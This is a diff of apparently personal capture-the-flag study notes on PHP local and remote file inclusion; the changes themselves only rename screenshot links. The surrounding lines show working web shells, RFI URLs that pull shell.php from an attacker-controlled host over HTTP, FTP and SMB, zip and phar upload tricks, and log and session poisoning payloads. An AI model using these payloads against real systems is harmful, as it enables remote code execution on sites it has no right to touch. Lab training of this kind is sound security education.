@@ -51,7 +51,7 @@ Now, we can URL encode the base64 string, and then pass it to the data wrapper w
 http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
 ```
 
-<figure><img src="../../../.gitbook/assets/image (237).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1113).png" alt=""><figcaption></figcaption></figure>
 
 We may also use cURL for the same attack, as follows:
 
@@ -105,9 +105,9 @@ First see the info of php.ini -->
 http://94.237.60.55:39692/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
 ```
 
-<figure><img src="../../../.gitbook/assets/image (20) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (737).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (23) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (738).png" alt=""><figcaption></figcaption></figure>
 
 So now, use the wrapper with `data://text/plain;base64,`
 
@@ -143,7 +143,7 @@ However, this may not always be reliable, as even if this setting is enabled, th
 http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
 ```
 
-<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (718).png" alt=""><figcaption></figcaption></figure>
 
 As we can see, the `index.php` page got included in the vulnerable section (i.e. History Description), so the page is indeed vulnerable to RFI, as we are able to include URLs. Furthermore, the `index.php` page did not get included as source code text but got executed and rendered as PHP, so the vulnerable function also allows PHP execution, which may allow us to execute code if we include a malicious PHP script that we host on our machine.
 
@@ -176,7 +176,7 @@ Now, we can include our local shell through RFI, like we did earlier, but using 
 http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
 ```
 
-<figure><img src="../../../.gitbook/assets/image (238).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1114).png" alt=""><figcaption></figcaption></figure>
 
 As we can see, we did get a connection on our python server, and the remote shell was included, and we executed the specified command:
 
@@ -206,7 +206,7 @@ This may also be useful in case http ports are blocked by a firewall or the `htt
 http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
 ```
 
-<figure><img src="../../../.gitbook/assets/image (238).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1114).png" alt=""><figcaption></figcaption></figure>
 
 #### SMB
 
@@ -232,7 +232,7 @@ Now, we can include our script by using a UNC path (e.g. `\\<OUR_IP>\share\shell
 http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (719).png" alt=""><figcaption></figcaption></figure>
 
 As we can see, this attack works in including our remote script, and we do not need any non-default settings to be enabled. However, we must note that this technique is `more likely to work if we were on the same network`, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.
 
@@ -240,7 +240,7 @@ As we can see, this attack works in including our remote script, and we do not n
 
 * Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in /
 
-<figure><img src="../../../.gitbook/assets/image (233).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1109).png" alt=""><figcaption></figcaption></figure>
 
 With it, we can verify the RFIm we can target to local index.php, now, exploit it -->
 
@@ -255,7 +255,7 @@ sudo python3 -m http.server 8000
 view-source:http://10.129.127.13/index.php?language=http://10.10.15.202:8000/shell.php&cmd=ls%20-la%20/exercise/flag.txt
 ```
 
-<figure><img src="../../../.gitbook/assets/image (234).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1110).png" alt=""><figcaption></figcaption></figure>
 
 ## LFI and File Uploads
 
@@ -273,7 +273,7 @@ This file on its own is completely harmless and would not affect normal web appl
 
 Now, we need to upload our malicious image file. To do so, we can go to the `Profile Settings` page and click on the avatar image to select our image, and then click on upload and our image should get successfully uploaded:
 
-<figure><img src="../../../.gitbook/assets/image (235).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1111).png" alt=""><figcaption></figcaption></figure>
 
 **Uploaded File Path**
 
@@ -291,7 +291,7 @@ With the uploaded file path at hand, all we need to do is to include the uploade
 http://<SERVER_IP>:/index.php?language=./profile_images/shell.gif&cmd=id
 ```
 
-<figure><img src="../../../.gitbook/assets/image (236).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1112).png" alt=""><figcaption></figcaption></figure>
 
 As we can see, we included our file and successfully executed the `id` command.
 
@@ -313,7 +313,7 @@ Once we upload the `shell.jpg` archive, we can include it with the `zip` wrapper
 http://<SERVER_IP>:/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
 ```
 
-<figure><img src="../../../.gitbook/assets/image (237).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1113).png" alt=""><figcaption></figcaption></figure>
 
 As we can see, this method also works in executing commands through zipped PHP scripts.
 
@@ -345,7 +345,7 @@ Now, we should have a phar file called `shell.jpg`. Once we upload it to the web
 http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
 ```
 
-<figure><img src="../../../.gitbook/assets/image (238).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1114).png" alt=""><figcaption></figcaption></figure>
 
 As we can see, the `id` command was successfully executed. Both the `zip` and `phar` wrapper methods should be considered as alternative methods in case the first method did not work, as the first method we discussed is the most reliable among the three.
 
@@ -363,11 +363,11 @@ echo '<?php system($_GET["cmd"]); ?>' > wshell.php && zip wshell.jpg wshell.php
 
 Then upload into my profile image the wshell.jpg preciously created
 
-<figure><img src="../../../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1115).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (240).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1116).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (241).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1117).png" alt=""><figcaption></figcaption></figure>
 
 Here, doesnt see the url of the image... so... we can see a file with name upload.php, it maybe containt the directory of iamges uploads.
 
@@ -377,15 +377,15 @@ Use the LFI to get the content of upload.php -->
 http://94.237.48.12:52545/index.php?language=php://filter/read=convert.base64-encode/resource=upload.php
 ```
 
-<figure><img src="../../../.gitbook/assets/image (242).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1118).png" alt=""><figcaption></figcaption></figure>
 
 Now, decode it base64 -->
 
-<figure><img src="../../../.gitbook/assets/image (243).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1119).png" alt=""><figcaption></figcaption></figure>
 
 OKAY, ./profile\_images/wshell.jpg so -->
 
-<figure><img src="../../../.gitbook/assets/image (244).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1120).png" alt=""><figcaption></figcaption></figure>
 
 Now, use the ZIP Upload mode -->
 
@@ -393,7 +393,7 @@ Now, use the ZIP Upload mode -->
 http://94.237.48.12:52545/index.php?language=zip://./profile_images/wshell.jpg%23wshell.php&cmd=ls
 ```
 
-<figure><img src="../../../.gitbook/assets/image (245).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1121).png" alt=""><figcaption></figcaption></figure>
 
 ## Log Poisoning
 
@@ -403,7 +403,7 @@ Most PHP web applications utilize `PHPSESSID` cookies, which can hold specific u
 
 The first thing we need to do in a PHP Session Poisoning attack is to examine our PHPSESSID session file and see if it contains any data we can control and poison. So, let's first check if we have a `PHPSESSID` cookie set to our session:
 
-<figure><img src="../../../.gitbook/assets/image (246).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1122).png" alt=""><figcaption></figcaption></figure>
 
 As we can see, our `PHPSESSID` cookie value is `nhhv8i0o6ua4g88bkdl9u1fdsd`, so it should be stored at `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`. Let's try include this session file through the LFI vulnerability and view its contents:
 
@@ -427,7 +427,7 @@ Now, let's include the session file once again to look at the contents:
 http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
 ```
 
-<figure><img src="../../../.gitbook/assets/image (247).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1123).png" alt=""><figcaption></figcaption></figure>
 
 This time, the session file contains `session_poisoning` instead of `es.php`, which confirms our ability to control the value of `page` in the session file. Our next step is to perform the `poisoning` step by writing PHP code to the session file. We can write a basic PHP web shell by changing the `?language=` parameter to a URL encoded web shell, as follows:
 
@@ -441,7 +441,7 @@ Finally, we can include the session file and use the `&cmd=id` to execute a comm
 http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
 ```
 
-<figure><img src="../../../.gitbook/assets/image (248).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1124).png" alt=""><figcaption></figcaption></figure>
 
 > Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction.
 
@@ -459,7 +459,7 @@ So, let's try including the Apache access log from `/var/log/apache2/access.log`
 http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
 ```
 
-<figure><img src="../../../.gitbook/assets/image (249).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1125).png" alt=""><figcaption></figcaption></figure>
 
 As we can see, we can read the log. The log contains the `remote IP address`, `request page`, `response code`, and the `User-Agent` header. As mentioned earlier, the `User-Agent` header is controlled by us through the HTTP request headers, so we should be able to poison this value.
 
@@ -467,11 +467,11 @@ As we can see, we can read the log. The log contains the `remote IP address`, `r
 
 To do so, we will use `Burp Suite` to intercept our earlier LFI request and modify the `User-Agent` header to `Apache Log Poisoning`:
 
-<figure><img src="../../../.gitbook/assets/image (250).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1126).png" alt=""><figcaption></figcaption></figure>
 
 As expected, our custom User-Agent value is visible in the included log file. Now, we can poison the `User-Agent` header by setting it to a basic PHP web shell:
 
-<figure><img src="../../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1127).png" alt=""><figcaption></figcaption></figure>
 
 We may also poison the log by sending a request through cURL, as follows:
 
@@ -482,7 +482,7 @@ eldeim@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
 
 As the log should now contain PHP code, the LFI vulnerability should execute this code, and we should be able to gain remote code execution. We can specify a command to be executed with (`&cmd=id`):
 
-<figure><img src="../../../.gitbook/assets/image (252).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1128).png" alt=""><figcaption></figcaption></figure>
 
 We see that we successfully executed the command. The exact same attack can be carried out on `Nginx` logs as well.
 
@@ -508,37 +508,37 @@ First, fuff to the LFI to search directories -->
 ffuf -u "http://94.237.51.163:32350/index.php?language=FUZZ" -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt -fs 2286
 ```
 
-<figure><img src="../../../.gitbook/assets/image (253).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1129).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (254).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1130).png" alt=""><figcaption></figcaption></figure>
 
 Now, intercept it with burpsuite -->
 
-<figure><img src="../../../.gitbook/assets/image (255).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1131).png" alt=""><figcaption></figcaption></figure>
 
 With it we can see that the user agent is reflected, so... now input a php webshell in the User-Agent -->
 
-<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (709).png" alt=""><figcaption></figcaption></figure>
 
 Now, with it we can target to `&cmd=id` -->
 
-<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (710).png" alt=""><figcaption></figcaption></figure>
 
 #### PHP Sesion Poisoning
 
 After we found the LFI, we need to see what is the cookie:
 
-<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (711).png" alt=""><figcaption></figcaption></figure>
 
 In this case is a PHPSESSID we know this cookie save into --> `/var/lib/php/sessions/sess_2cabpj1b2p455j3iiccr8luurj`
 
-<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (713).png" alt=""><figcaption></figcaption></figure>
 
 We can see too, thsi reflected the until search, in this case, us cookie, so... if y paste in url/LFI a web shell, then they take my command -->
 
-<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (714).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (715).png" alt=""><figcaption></figcaption></figure>
 
 Now i set up a urlencode webshell -->
 
@@ -546,6 +546,6 @@ Now i set up a urlencode webshell -->
 %3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
 ```
 
-<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (716).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (717).png" alt=""><figcaption></figcaption></figure>
